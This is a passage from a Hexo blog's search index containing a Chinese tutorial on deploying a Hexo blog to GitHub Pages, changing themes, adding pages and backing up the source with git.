文件夹，并获取其中 <code>id_rsa.pub</code> 的值，将其添加到 <code>github</code> 的 <code>SSH Key</code> </p><p>检测是否成功添加 <code>SSH Key</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh git@github.com</span><br></pre></td></tr></table></figure><p>打开 <code>blog</code> 文件夹下的 <code>_config.yml</code> 文件，修改最后一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com/&#123;github用户名&#125;/&#123;github用户名&#125;.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>安装 <code>git</code> 部署插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>新建一篇新的文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;article title&quot;</span></span><br></pre></td></tr></table></figure><p>运行完会输出一个路径，这就是这篇文章的位置，此时就可以编辑该文章</p><p>写完后可以输入命令生成静态文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>本地预览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>上传到 <code>github</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>可以直接下载一个主题到 <code>themes</code> 文件夹下，将 <code>_config.yml</code> 中的主题名改为需要更换的</p><p>主题中心</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hexo.io/themes/</span><br></pre></td></tr></table></figure><p>全部弄好后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>想要修改主题配置，可以去所使用的主题文件夹下，找到 <code>_config.yml</code> 并修改</p><p>可以修改侧边栏、页脚等，侧边栏中都是页面，新建页面自定义设计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;分类&quot;</span></span><br></pre></td></tr></table></figure><p><code>friends</code> 、<code>tags</code> 、<code>categories</code> 、<code>about</code> 分别修改对应文件夹下 <code>index.md</code> 为如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2019-05-03 12:03:35</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>修改主题下的配置文件，将评论插件下的 <code>enabled</code> 改为 <code>true</code> ，然后按照教程进行评论配置</p><h2 id="备份博客"><a href="#备份博客" class="headerlink" title="备份博客"></a>备份博客</h2><p>在 <code>myBlog</code> 下，使用 <code>git</code> 将博客仓库克隆到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/&#123;用户名&#125;/&#123;用户名&#125;.github.io.git</span><br></pre></td></tr></table></figure><p>进入 <code>&#123;用户名&#125;.github.io</code> 文件夹，删除其中除了 <code>.git</code> 的所有文件，然后复制 <code>blog</code> 文件夹下的所有文件到本文件夹下</p><p>查看 <code>.gitignore</code> 文件，使其为如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.<span class="built_in">log</span></span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure><p>切换分支，并提交所有更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hexo</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;hexo&quot;</span></span><br><span class="line">git push origin hexo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
